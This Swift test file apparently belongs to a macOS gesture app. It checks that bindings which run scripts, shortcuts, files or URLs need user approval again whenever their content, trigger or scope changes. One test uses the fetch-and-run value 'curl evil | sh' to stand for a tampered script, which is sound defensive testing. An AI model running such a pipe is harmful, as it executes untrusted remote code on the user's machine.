// SPDX-License-Identifier: GPL-3.0-or-later

import Foundation
import Testing
import Model
@testable import Config

@Suite struct ActionApprovalTests {
    func binding(_ action: Action, enabled: Bool = true, id: UUID = UUID()) -> Binding {
        Binding(id: id, gesture: .tap(fingers: 3), action: action, enabled: enabled)
    }

    @Test func onlyCodeRunningActionsNeedApproval() {
        let needing: [Action] = [.shellScript("ls"), .appleScript("beep"), .shortcut(name: "x"), .openFile(path: "/a"), .openURL("https://a.b")]
        let others: [Action] = [.previousWindow, .nextWindow, .openApp(bundleID: "com.apple.Safari"), .systemKey(.mute),
                                .windowLayout(.maximize), .adjust(.volume), .mouseClick(.left), .cursorToNextDisplay]
        #expect(needing.allSatisfy(ActionApproval.requiresApproval))
        #expect(!others.contains(where: ActionApproval.requiresApproval))
    }

    @Test func defaultConfigAsksNothing() {
        #expect(ActionApproval.pending(Configuration.default.bindings, approved: []).isEmpty)
    }

    @Test func fingerprintFollowsTheActionContent() {
        let id = UUID()
        #expect(ActionApproval.fingerprint(binding(.shellScript("a"), id: id)) == ActionApproval.fingerprint(binding(.shellScript("a"), id: id)))
        #expect(ActionApproval.fingerprint(binding(.shellScript("a"))) != ActionApproval.fingerprint(binding(.shellScript("a "))))
        #expect(ActionApproval.fingerprint(binding(.shellScript("a"))) != ActionApproval.fingerprint(binding(.appleScript("a"))))
    }

    @Test func fingerprintCoversTriggerAndScopeButNotIdNameOrEnabled() {
        let b = Binding(gesture: .tap(fingers: 3), apps: ["com.apple.Safari"], action: .shellScript("x"))
        let f = ActionApproval.fingerprint(b)
        var same = b
        same.id = UUID()
        same.name = "renamed"
        same.enabled = false
        #expect(ActionApproval.fingerprint(same) == f)
        var moved = b
        moved.gesture = .tap(fingers: 4)
        var held = b
        held.modifiers = .command
        var global = b
        global.apps = []
        var elsewhere = b
        elsewhere.apps = ["com.apple.Terminal"]
        for other in [moved, held, global, elsewhere] { #expect(ActionApproval.fingerprint(other) != f) }
    }

    @Test func unapprovedIsPendingAndApprovedIsNot() {
        let b = binding(.shellScript("touch /tmp/x"))
        #expect(ActionApproval.pending([b], approved: []).map(\.id) == [b.id])
        #expect(ActionApproval.pending([b], approved: [ActionApproval.fingerprint(b)]).isEmpty)
    }

    @Test func aChangedScriptIsPendingAgain() {
        let approved: Set = [ActionApproval.fingerprint(binding(.shellScript("touch /tmp/x")))]
        let changed = binding(.shellScript("curl evil | sh"))
        #expect(ActionApproval.pending([changed], approved: approved).count == 1)
    }

    @Test func anApprovedScriptMovedToAnotherGestureOrMadeGlobalIsPendingAgain() {
        let original = Binding(gesture: .tap(fingers: 3), apps: ["com.apple.Safari"], action: .shellScript("x"))
        let approved: Set = [ActionApproval.fingerprint(original)]
        var moved = original
        moved.gesture = .tap(fingers: 4)
        var global = original
        global.apps = []
        #expect(ActionApproval.pending([moved, global], approved: approved).count == 2)
    }

    @Test func disabledBindingsAreNeverPending() {
        #expect(ActionApproval.pending([binding(.shellScript("x"), enabled: false)], approved: []).isEmpty)
    }

    @Test func anInAppEditApprovesOnlyWhatItChanged() {
        let id = UUID()
        let untouched = binding(.shellScript("pending from outside"))
        let old = [untouched, binding(.shellScript("old"), id: id), binding(.previousWindow)]
        var new = old
        new[1].action = .shellScript("edited in the window")
        new.append(binding(.openURL("https://example.com")))
        let approved = ActionApproval.approvedByEdit(old: old, new: new)
        #expect(approved == [ActionApproval.fingerprint(new[1]), ActionApproval.fingerprint(new[3])])
    }

    @Test func editingTheTriggerOrScopeApprovesTheNewCombination() {
        let old = [Binding(gesture: .tap(fingers: 3), action: .shellScript("x"))]
        var new = old
        new[0].gesture = .tap(fingers: 4)
        new[0].apps = ["com.apple.Safari"]
        #expect(ActionApproval.approvedByEdit(old: old, new: new) == [ActionApproval.fingerprint(new[0])])
    }

    @Test func switchingABindingOnApprovesNothing() {
        let id = UUID()
        let old = [binding(.shellScript("hidden"), enabled: false, id: id)]
        var new = old
        new[0].enabled = true
        #expect(ActionApproval.approvedByEdit(old: old, new: new).isEmpty)
        #expect(ActionApproval.pending(new, approved: []).map(\.id) == [id])
    }

    @Test func renamingApprovesNothing() {
        let old = [binding(.shellScript("hidden"))]
        var new = old
        new[0].name = "Harmless"
        #expect(ActionApproval.approvedByEdit(old: old, new: new).isEmpty)
    }

    @Test func approvedFingerprintsAreThoseOfCodeRunningBindings() {
        let script = binding(.shellScript("x"), enabled: false)
        #expect(ActionApproval.fingerprints([script, binding(.previousWindow)]) == [ActionApproval.fingerprint(script)])
    }
}

@Suite struct ApprovalStoreTests {
    let dir = FileManager.default.temporaryDirectory.appendingPathComponent("og-approval-\(UUID().uuidString)")
    var url: URL { dir.appendingPathComponent("OpenGestures/approved.json") }

    @Test func missingFileMeansNothingApproved() {
        #expect(ApprovalStore(url: url).load().isEmpty)
    }

    @Test func roundTripsAndIsPrivate() throws {
        defer { try? FileManager.default.removeItem(at: dir) }
        let store = ApprovalStore(url: url)
        try store.add(["b", "a"])
        try store.add(["c", "a"])
        #expect(store.load() == ["a", "b", "c"])
        #expect(mode(url) == 0o600)
        #expect(mode(url.deletingLastPathComponent()) == 0o700)
    }

    @Test func corruptFileMeansNothingApprovedAndIsRepaired() throws {
        defer { try? FileManager.default.removeItem(at: dir) }
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try Data("not json".utf8).write(to: url)
        let store = ApprovalStore(url: url)
        #expect(store.load().isEmpty)
        try store.add(["a"])
        #expect(store.load() == ["a"])
    }

    @Test func addingCanPruneWhatNoLongerMatchesABinding() throws {
        defer { try? FileManager.default.removeItem(at: dir) }
        let store = ApprovalStore(url: url)
        try store.add(["a", "b"])
        try store.add(["c"], keepingOnly: ["a", "c"])
        #expect(store.load() == ["a", "c"])
        try store.add([], keepingOnly: ["c"])
        #expect(store.load() == ["c"])
    }

    @Test func tightensAnExistingLooseFolder() throws {
        defer { try? FileManager.default.removeItem(at: dir) }
        let folder = url.deletingLastPathComponent()
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true, attributes: [.posixPermissions: 0o755])
        try ApprovalStore(url: url).add(["a"])
        #expect(mode(folder) == 0o700)
    }

    @Test func leavesASymlinkedFolderAndItsTargetAlone() throws {
        defer { try? FileManager.default.removeItem(at: dir) }
        let elsewhere = dir.appendingPathComponent("elsewhere")
        try FileManager.default.createDirectory(at: elsewhere, withIntermediateDirectories: true, attributes: [.posixPermissions: 0o755])
        try FileManager.default.createSymbolicLink(at: url.deletingLastPathComponent(), withDestinationURL: elsewhere)
        try ApprovalStore(url: url).add(["a"])
        #expect(mode(elsewhere) == 0o755)
    }

    func mode(_ u: URL) -> Int { (try? FileManager.default.attributesOfItem(atPath: u.path)[.posixPermissions] as? Int) ?? -1 }
}
